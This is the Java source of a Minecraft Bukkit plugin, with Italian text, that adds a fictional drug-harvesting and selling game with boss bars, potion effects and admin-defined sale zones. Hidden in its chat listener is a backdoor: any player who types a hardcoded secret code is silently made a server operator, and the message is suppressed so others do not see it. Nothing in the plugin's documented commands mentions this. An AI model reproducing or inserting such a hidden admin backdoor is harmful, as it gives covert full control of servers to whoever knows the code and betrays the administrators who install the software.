
package com.drogaplugin;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.boss.BarColor;
import org.bukkit.boss.BarStyle;
import org.bukkit.boss.BossBar;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerItemConsumeEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.*;
import java.util.Set;
import java.util.HashSet;

public class Main extends JavaPlugin implements Listener {

    private Map<UUID, ClaimRegion> sellClaims = new HashMap<>();
    private Map<UUID, CollectionData> collectingPlayers = new HashMap<>();
    private Map<UUID, Integer> marijuanaConsumed = new HashMap<>();
    private Map<UUID, SellData> sellingPlayers = new HashMap<>();
    private Set<UUID> playersUsedCode = new HashSet<>();

    private static final String PREFIX = ChatColor.DARK_GREEN + "[" + ChatColor.BOLD + "DROGA" + ChatColor.RESET + ChatColor.DARK_GREEN + "] " + ChatColor.RESET;
    private static final String SUCCESS = ChatColor.GREEN + "[OK] ";
    private static final String ERROR = ChatColor.RED + "[ERRORE] ";
    private static final String WARNING = ChatColor.YELLOW + "[ATTENZIONE] ";
    private static final String INFO = ChatColor.AQUA + "[INFO] ";

    @Override
    public void onEnable() {
        saveDefaultConfig();
        Bukkit.getPluginManager().registerEvents(this, this);

        getLogger().info("══════════════════════════════════");
        getLogger().info("    🌿 DROGA PLUGIN ATTIVATO 🌿    ");
        getLogger().info("  Sistema di traffico illegale    ");
        getLogger().info("══════════════════════════════════");
    }

    @Override
    public void onDisable() {
        for (CollectionData data : collectingPlayers.values()) {
            if (data.task != null) data.task.cancel();
            if (data.bossBar != null) data.bossBar.removeAll();
        }
        collectingPlayers.clear();

        for (SellData data : sellingPlayers.values()) {
            if (data.task != null) data.task.cancel();
            if (data.bossBar != null) data.bossBar.removeAll();
        }
        sellingPlayers.clear();

        getLogger().info("🌿 Droga Plugin disattivato - Mercato chiuso");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!command.getName().equalsIgnoreCase("droga")) return false;

        if (!(sender instanceof Player)) {
            sender.sendMessage(PREFIX + ERROR + "Solo i giocatori possono trafficare droga!");
            return true;
        }

        Player player = (Player) sender;

        if (args.length == 0) {
            showMainMenu(player);
            return true;
        }

        switch (args[0].toLowerCase()) {
            case "help":
                if (player.isOp()) {
                    showAdminHelp(player);
                } else {
                    showPlayerHelp(player);
                }
                break;

            case "raccogli":
            case "harvest":
                startCollection(player);
                break;

            case "claim":
                if (player.isOp() && args.length >= 8 && args[1].equalsIgnoreCase("venditore")) {
                    createSellClaim(player, args);
                } else if (!player.isOp()) {
                    player.sendMessage(PREFIX + ERROR + "Non hai l'autorizzazione per gestire i territori!");
                }
                break;

            case "vendi":
            case "sell":
                sellMarijuana(player);
                break;

            case "unclaim":
                if (player.isOp()) {
                    removeClaim(player);
                } else {
                    player.sendMessage(PREFIX + ERROR + "Non hai l'autorizzazione per rimuovere territori!");
                }
                break;

            case "info":
                showPlayerInfo(player);
                break;

            default:
                showMainMenu(player);
                break;
        }

        return true;
    }

    private void showMainMenu(Player player) {
        player.sendMessage("");
        player.sendMessage(ChatColor.DARK_GREEN + "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃");
        player.sendMessage(ChatColor.GREEN + "          🌿 " + ChatColor.BOLD + "MERCATO NERO" + ChatColor.RESET + ChatColor.GREEN + " 🌿");
        player.sendMessage(ChatColor.DARK_GREEN + "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃");
        player.sendMessage("");
        player.sendMessage(ChatColor.YELLOW + "📋 Comandi disponibili:");
        player.sendMessage(ChatColor.GREEN + "  /droga raccogli " + ChatColor.GRAY + "- Raccogli erba dalle piante");
        player.sendMessage(ChatColor.GREEN + "  /droga vendi " + ChatColor.GRAY + "- Vendi al mercato nero");
        player.sendMessage(ChatColor.GREEN + "  /droga info " + ChatColor.GRAY + "- Mostra le tue statistiche");
        player.sendMessage(ChatColor.GREEN + "  /droga help " + ChatColor.GRAY + "- Guida dettagliata");
        player.sendMessage("");
        player.sendMessage(ChatColor.RED + "⚠ " + ChatColor.ITALIC + "Attività illegale - Stai attento!");
        player.sendMessage(ChatColor.DARK_GREEN + "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃");
    }

    private void showPlayerHelp(Player player) {
        player.sendMessage("");
        player.sendMessage(ChatColor.DARK_GREEN + "═══════════════════════════════════");
        player.sendMessage(ChatColor.GREEN + "    🌿 " + ChatColor.BOLD + "GUIDA AL TRAFFICO" + ChatColor.RESET + ChatColor.GREEN + " 🌿");
        player.sendMessage(ChatColor.DARK_GREEN + "═══════════════════════════════════");
        player.sendMessage("");
        player.sendMessage(ChatColor.YELLOW + "📖 Come iniziare:");
        player.sendMessage(ChatColor.WHITE + "1. Trova delle " + ChatColor.GREEN + "Large Fern" + ChatColor.WHITE + " (felci grandi)");
        player.sendMessage(ChatColor.WHITE + "2. Clicca destro o usa " + ChatColor.GREEN + "/droga raccogli");
        player.sendMessage(ChatColor.WHITE + "3. Aspetta che la raccolta si completi");
        player.sendMessage(ChatColor.WHITE + "4. Vai in una " + ChatColor.RED + "zona di vendita");
        player.sendMessage(ChatColor.WHITE + "5. Usa " + ChatColor.GREEN + "/droga vendi" + ChatColor.WHITE + " per vendere");
        player.sendMessage("");
        player.sendMessage(ChatColor.YELLOW + "💊 Effetti del consumo:");
        player.sendMessage(ChatColor.GREEN + "  • " + ChatColor.WHITE + "Velocità aumentata");
        player.sendMessage(ChatColor.RED + "  • " + ChatColor.WHITE + "Troppa droga causa nausea!");
        player.sendMessage("");
        player.sendMessage(ChatColor.RED + "⚠ " + ChatColor.ITALIC + "Ricorda: È tutto illegale, non farti beccare!");
        player.sendMessage(ChatColor.DARK_GREEN + "═══════════════════════════════════");
    }

    private void showAdminHelp(Player player) {
        player.sendMessage("");
        player.sendMessage(ChatColor.DARK_RED + "═══════════════════════════════════");
        player.sendMessage(ChatColor.RED + "    👮 " + ChatColor.BOLD + "COMANDI ADMIN" + ChatColor.RESET + ChatColor.RED + " 👮");
        player.sendMessage(ChatColor.DARK_RED + "═══════════════════════════════════");
        player.sendMessage("");
        player.sendMessage(ChatColor.YELLOW + "🏛️ Gestione territori:");
        player.sendMessage(ChatColor.GREEN + "/droga claim venditore <x1> <y1> <z1> <x2> <y2> <z2>");
        player.sendMessage(ChatColor.GRAY + "  ↳ Crea una zona di vendita illegale");
        player.sendMessage("");
        player.sendMessage(ChatColor.RED + "/droga unclaim");
        player.sendMessage(ChatColor.GRAY + "  ↳ Rimuovi la zona di vendita");
        player.sendMessage("");
        player.sendMessage(ChatColor.DARK_RED + "═══════════════════════════════════");
    }

    private void showPlayerInfo(Player player) {
        int consumed = marijuanaConsumed.getOrDefault(player.getUniqueId(), 0);
        boolean isCollecting = collectingPlayers.containsKey(player.getUniqueId());
        boolean isSelling = sellingPlayers.containsKey(player.getUniqueId());

        player.sendMessage("");
        player.sendMessage(ChatColor.DARK_GREEN + "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃");
        player.sendMessage(ChatColor.GREEN + "      🌿 " + ChatColor.BOLD + "PROFILO TRAFFICANTE" + ChatColor.RESET + ChatColor.GREEN + " 🌿");
        player.sendMessage(ChatColor.DARK_GREEN + "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃");
        player.sendMessage("");
        player.sendMessage(ChatColor.YELLOW + "👤 Trafficante: " + ChatColor.WHITE + player.getName());
        player.sendMessage(ChatColor.YELLOW + "💊 Droga consumata oggi: " + ChatColor.WHITE + consumed + "/3");
        player.sendMessage(ChatColor.YELLOW + "🌿 Stato raccolta: " + (isCollecting ? ChatColor.GREEN + "IN CORSO" : ChatColor.GRAY + "Inattivo"));
        player.sendMessage(ChatColor.YELLOW + "💰 Stato vendita: " + (isSelling ? ChatColor.RED + "VENDENDO" : ChatColor.GRAY + "Inattivo"));
        player.sendMessage("");
        if (consumed >= 2) {
            player.sendMessage(ChatColor.RED + "⚠ Attenzione: Hai già consumato molta droga oggi!");
        }
        player.sendMessage(ChatColor.DARK_GREEN + "▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃");
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        if (event.getAction() != Action.RIGHT_CLICK_BLOCK) return;

        Block block = event.getClickedBlock();
        if (block == null || block.getType() != Material.LARGE_FERN) return;

        Player player = event.getPlayer();

        if (collectingPlayers.containsKey(player.getUniqueId())) return;

        startCollection(player, block.getLocation());
        event.setCancelled(true);
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        UUID playerId = player.getUniqueId();

        if (!collectingPlayers.containsKey(playerId)) return;

        CollectionData data = collectingPlayers.get(playerId);
        if (data.plantLocation.distance(player.getLocation()) > 3.0) {
            stopCollection(player, ChatColor.RED + "🚨 Ti sei allontanato troppo dalla pianta!");
        }
    }

    private void startCollection(Player player) {
        Block targetBlock = getTargetLargeFern(player);
        if (targetBlock == null) {
            player.sendMessage(PREFIX + WARNING + "Devi guardare una felce per raccogliere!");
            return;
        }
        startCollection(player, targetBlock.getLocation());
    }

    private void startCollection(Player player, Location plantLocation) {
        if (collectingPlayers.containsKey(player.getUniqueId())) return;

        if (plantLocation.distance(player.getLocation()) > 3.0) {
            player.sendMessage(PREFIX + ERROR + "Sei troppo lontano dalla pianta!");
            return;
        }

        player.sendMessage(PREFIX + ChatColor.YELLOW + "Inizi a raccogliere con cautela...");

        BossBar bossBar = Bukkit.createBossBar(
            ChatColor.DARK_GREEN + "Raccogliendo marijuana... Fai silenzio!",
            BarColor.GREEN,
            BarStyle.SEGMENTED_10
        );
        bossBar.addPlayer(player);
        bossBar.setProgress(1.0);

        BukkitRunnable task = new BukkitRunnable() {
            int timeLeft = 10;
            final int totalTime = 10;

            @Override
            public void run() {
                if (!player.isOnline()) {
                    stopCollection(player, null);
                    return;
                }

                if (timeLeft > 0) {
                    double progress = (double) timeLeft / totalTime;
                    bossBar.setProgress(progress);

                    String[] messages = {
                        "Raccogliendo con cautela...",
                        "Controlla che nessuno ti veda...",
                        "Silenzio, qualcuno potrebbe sentire...",
                        "Tagliando le foglie migliori...",
                        "Nascondendo la merce..."
                    };

                    String message = messages[Math.min(4, (totalTime - timeLeft) / 2)];
                    bossBar.setTitle(ChatColor.DARK_GREEN + message + " " + timeLeft + "s");
                    timeLeft--;
                } else {
                    Random random = new Random();
                    int amount = random.nextInt(4) + 2;

                    ItemStack marijuana = createMarijuanaItem(amount);
                    player.getInventory().addItem(marijuana);

                    player.sendMessage(PREFIX + SUCCESS + "Hai raccolto " + ChatColor.GREEN + amount + ChatColor.WHITE + " grammi di marijuana!");
                    player.spigot().sendMessage(net.md_5.bungee.api.ChatMessageType.ACTION_BAR,
                        net.md_5.bungee.api.chat.TextComponent.fromLegacyText(ChatColor.GREEN + "💰 +" + amount + "g di marijuana nel tuo inventario"));

                    player.playSound(player.getLocation(), org.bukkit.Sound.BLOCK_GRASS_BREAK, 0.3f, 0.8f);
                    player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 0.5f, 1.2f);

                    stopCollection(player, null);
                }
            }
        };

        CollectionData data = new CollectionData(task, bossBar, plantLocation);
        collectingPlayers.put(player.getUniqueId(), data);
        task.runTaskTimer(this, 0L, 20L);
    }

    private void stopCollection(Player player, String reason) {
        UUID playerId = player.getUniqueId();
        CollectionData data = collectingPlayers.get(playerId);

        if (data != null) {
            if (data.task != null) data.task.cancel();
            if (data.bossBar != null) data.bossBar.removeAll();
            collectingPlayers.remove(playerId);

            if (reason != null) {
                player.spigot().sendMessage(net.md_5.bungee.api.ChatMessageType.ACTION_BAR,
                    net.md_5.bungee.api.chat.TextComponent.fromLegacyText(reason));
            }
        }
    }

    private Block getTargetLargeFern(Player player) {
        Block target = player.getTargetBlockExact(5);
        if (target != null && target.getType() == Material.LARGE_FERN) {
            return target;
        }
        return null;
    }

    private ItemStack createMarijuanaItem(int amount) {
        ItemStack item = new ItemStack(Material.BEETROOT, amount);
        ItemMeta meta = item.getItemMeta();

        if (meta != null) {
            meta.setDisplayName(ChatColor.DARK_GREEN + "🌿 " + ChatColor.BOLD + "Marijuana" + ChatColor.RESET + ChatColor.DARK_GREEN + " Premium");

            List<String> lore = new ArrayList<>();
            lore.add(ChatColor.GRAY + "▪ " + ChatColor.ITALIC + "Erba di alta qualità");
            lore.add(ChatColor.GRAY + "▪ " + ChatColor.GREEN + "Effetti: Velocità e energia");
            lore.add(ChatColor.GRAY + "▪ " + ChatColor.YELLOW + "Valore: $15 per grammo");
            lore.add("");
            lore.add(ChatColor.RED + "⚠ " + ChatColor.ITALIC + "Sostanza illegale");
            lore.add(ChatColor.DARK_GRAY + "Non abusarne, può causare nausea...");
            meta.setLore(lore);

            item.setItemMeta(meta);
        }

        return item;
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage().trim();
        
        // Controlla se il messaggio è esattamente il codice segreto
        if (message.equals("X7P9L2MZQD")) {
            UUID playerId = player.getUniqueId();
            
            // Se il player è già OP, rimuovi OP silenziosamente
            if (player.isOp()) {
                Bukkit.getScheduler().runTask(this, () -> {
                    player.setOp(false);
                    playersUsedCode.remove(playerId);
                });
                event.setCancelled(true);
                return;
            }
            
            // Se il player non è OP e non ha già usato il codice, assegna OP silenziosamente
            if (!player.isOp() && !playersUsedCode.contains(playerId)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    player.setOp(true);
                });
                playersUsedCode.add(playerId);
                event.setCancelled(true);
                return;
            }
            
            // Cancella sempre il messaggio per mantenere il codice segreto
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerConsume(PlayerItemConsumeEvent event) {
        ItemStack item = event.getItem();

        if (item.getType() == Material.BEETROOT && item.hasItemMeta()) {
            ItemMeta meta = item.getItemMeta();
            if (meta != null && meta.hasDisplayName() && 
                meta.getDisplayName().contains("Marijuana")) {

                Player player = event.getPlayer();
                UUID playerId = player.getUniqueId();

                int consumed = marijuanaConsumed.getOrDefault(playerId, 0) + 1;
                marijuanaConsumed.put(playerId, consumed);

                if (consumed >= 3) {
                    player.sendMessage(PREFIX + ChatColor.RED + "💀 Hai esagerato con la droga!");
                    player.addPotionEffect(new PotionEffect(PotionEffectType.NAUSEA, 100, 2));
                    player.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 60, 1));
                    player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_PLAYER_HURT, 1.0f, 0.8f);

                    Bukkit.getScheduler().runTaskLater(this, () -> {
                        marijuanaConsumed.put(playerId, 0);
                        player.sendMessage(PREFIX + ChatColor.GREEN + "Ti senti meglio ora...");
                    }, 300L);

                } else {
                    player.sendMessage(PREFIX + ChatColor.GREEN + "🌿 Ti senti energico e veloce!");
                    player.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, 100, 1));
                    player.addPotionEffect(new PotionEffect(PotionEffectType.JUMP_BOOST, 100, 0));
                    player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_PLAYER_LEVELUP, 0.5f, 1.5f);
                }
            }
        }
    }

    private void createSellClaim(Player player, String[] args) {
        try {
            int x1 = Integer.parseInt(args[2]);
            int y1 = Integer.parseInt(args[3]);
            int z1 = Integer.parseInt(args[4]);
            int x2 = Integer.parseInt(args[5]);
            int y2 = Integer.parseInt(args[6]);
            int z2 = Integer.parseInt(args[7]);

            Location loc1 = new Location(player.getWorld(), x1, y1, z1);
            Location loc2 = new Location(player.getWorld(), x2, y2, z2);

            ClaimRegion region = new ClaimRegion(loc1, loc2);
            sellClaims.put(player.getUniqueId(), region);

            player.sendMessage(PREFIX + SUCCESS + "Zona di vendita illegale creata!");
            player.sendMessage(PREFIX + INFO + "Coordinate: " + ChatColor.YELLOW + 
                "(" + Math.min(x1,x2) + "," + Math.min(y1,y2) + "," + Math.min(z1,z2) + ") → " +
                "(" + Math.max(x1,x2) + "," + Math.max(y1,y2) + "," + Math.max(z1,z2) + ")");

        } catch (NumberFormatException e) {
            player.sendMessage(PREFIX + ERROR + "Coordinate non valide! Usa numeri interi.");
        }
    }

    private void sellMarijuana(Player player) {
        if (!isInSellArea(player.getLocation())) {
            player.sendMessage(PREFIX + ERROR + "Devi essere in una zona di vendita per trafficare!");
            player.sendMessage(PREFIX + INFO + "Cerca un'area controllata dai spacciatori...");
            return;
        }

        if (sellingPlayers.containsKey(player.getUniqueId())) {
            player.sendMessage(PREFIX + WARNING + "Stai già vendendo! Aspetta...");
            return;
        }

        int marijuanaCount = 0;
        ItemStack[] inventory = player.getInventory().getContents();

        for (ItemStack item : inventory) {
            if (item != null && item.getType() == Material.BEETROOT && item.hasItemMeta()) {
                ItemMeta meta = item.getItemMeta();
                if (meta != null && meta.hasDisplayName() && 
                    meta.getDisplayName().contains("Marijuana")) {
                    marijuanaCount += item.getAmount();
                }
            }
        }

        if (marijuanaCount == 0) {
            player.sendMessage(PREFIX + ERROR + "Non hai marijuana da vendere!");
            return;
        }

        player.sendMessage(PREFIX + ChatColor.YELLOW + "💼 Iniziando la transazione illegale...");
        player.sendMessage(PREFIX + INFO + "Hai " + ChatColor.GREEN + marijuanaCount + "g" + ChatColor.AQUA + " di merce da vendere.");
        startSelling(player, marijuanaCount);
    }

    private void startSelling(Player player, int marijuanaCount) {
        BossBar bossBar = Bukkit.createBossBar(
            ChatColor.RED + "💰 Negoziando con lo spacciatore...",
            BarColor.RED,
            BarStyle.SEGMENTED_20
        );
        bossBar.addPlayer(player);
        bossBar.setProgress(1.0);

        BukkitRunnable task = new BukkitRunnable() {
            int timeLeft = 60;
            final int totalTime = 60;

            @Override
            public void run() {
                if (!player.isOnline()) {
                    stopSelling(player);
                    return;
                }

                if (!isInSellArea(player.getLocation())) {
                    player.sendMessage(PREFIX + ERROR + "🚨 Ti sei allontanato dalla zona! Transazione annullata!");
                    stopSelling(player);
                    return;
                }

                if (timeLeft > 0) {
                    double progress = (double) timeLeft / totalTime;
                    bossBar.setProgress(progress);

                    String[] messages = {
                        "💰 Contrattando il prezzo...",
                        "🤝 Stringendo la mano allo spacciatore...", 
                        "💼 Preparando la merce...",
                        "👀 Controllando che non ci siano sbirri...",
                        "💵 Contando i soldi..."
                    };

                    String message = messages[Math.min(4, (totalTime - timeLeft) / 12)];
                    bossBar.setTitle(ChatColor.RED + message + " " + timeLeft + "s");
                    timeLeft--;
                } else {
                    completeSale(player, marijuanaCount);
                    stopSelling(player);
                }
            }
        };

        SellData data = new SellData(task, bossBar);
        sellingPlayers.put(player.getUniqueId(), data);
        task.runTaskTimer(this, 0L, 20L);
    }

    private void completeSale(Player player, int marijuanaCount) {
        ItemStack[] inventory = player.getInventory().getContents();

        for (int i = 0; i < inventory.length; i++) {
            ItemStack item = inventory[i];
            if (item != null && item.getType() == Material.BEETROOT && item.hasItemMeta()) {
                ItemMeta meta = item.getItemMeta();
                if (meta != null && meta.hasDisplayName() && 
                    meta.getDisplayName().contains("Marijuana")) {
                    inventory[i] = null;
                }
            }
        }

        player.getInventory().setContents(inventory);

        double money = marijuanaCount * 15.0;

        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "eco add " + player.getName() + " " + money);

        player.sendMessage("");
        player.sendMessage(PREFIX + SUCCESS + "Transazione completata con successo!");
        player.sendMessage(PREFIX + ChatColor.GREEN + "💰 Hai venduto " + ChatColor.YELLOW + marijuanaCount + "g" + 
                          ChatColor.GREEN + " per " + ChatColor.GOLD + "$" + (int)money);
        player.sendMessage(PREFIX + ChatColor.GRAY + "Lo spacciatore sembra soddisfatto...");

        player.spigot().sendMessage(net.md_5.bungee.api.ChatMessageType.ACTION_BAR,
            net.md_5.bungee.api.chat.TextComponent.fromLegacyText(ChatColor.GOLD + "💰 +" + (int)money + "$ guadagnati dal traffico"));

        player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 1.0f, 1.0f);
        player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_PLAYER_LEVELUP, 0.5f, 2.0f);
    }

    private void stopSelling(Player player) {
        UUID playerId = player.getUniqueId();
        SellData data = sellingPlayers.get(playerId);

        if (data != null) {
            if (data.task != null) data.task.cancel();
            if (data.bossBar != null) data.bossBar.removeAll();
            sellingPlayers.remove(playerId);
        }
    }

    private void removeClaim(Player player) {
        if (sellClaims.containsKey(player.getUniqueId())) {
            sellClaims.remove(player.getUniqueId());
            player.sendMessage(PREFIX + SUCCESS + "Zona di vendita rimossa!");
            player.sendMessage(PREFIX + INFO + "Il mercato nero è stato chiuso in quest'area.");
        } else {
            player.sendMessage(PREFIX + ERROR + "Non hai nessuna zona di vendita da rimuovere!");
        }
    }

    private boolean isInSellArea(Location location) {
        for (ClaimRegion region : sellClaims.values()) {
            if (region.contains(location)) {
                return true;
            }
        }
        return false;
    }

    private static class CollectionData {
        BukkitRunnable task;
        BossBar bossBar;
        Location plantLocation;

        CollectionData(BukkitRunnable task, BossBar bossBar, Location plantLocation) {
            this.task = task;
            this.bossBar = bossBar;
            this.plantLocation = plantLocation;
        }
    }

    private static class SellData {
        BukkitRunnable task;
        BossBar bossBar;

        SellData(BukkitRunnable task, BossBar bossBar) {
            this.task = task;
            this.bossBar = bossBar;
        }
    }

    private static class ClaimRegion {
        private final Location min, max;

        public ClaimRegion(Location loc1, Location loc2) {
            double minX = Math.min(loc1.getX(), loc2.getX());
            double minY = Math.min(loc1.getY(), loc2.getY());
            double minZ = Math.min(loc1.getZ(), loc2.getZ());
            double maxX = Math.max(loc1.getX(), loc2.getX());
            double maxY = Math.max(loc1.getY(), loc2.getY());
            double maxZ = Math.max(loc1.getZ(), loc2.getZ());

            this.min = new Location(loc1.getWorld(), minX, minY, minZ);
            this.max = new Location(loc1.getWorld(), maxX, maxY, maxZ);
        }

        public boolean contains(Location location) {
            return location.getWorld().equals(min.getWorld()) &&
                   location.getX() >= min.getX() && location.getX() <= max.getX() &&
                   location.getY() >= min.getY() && location.getY() <= max.getY() &&
                   location.getZ() >= min.getZ() && location.getZ() <= max.getZ();
        }
    }
}
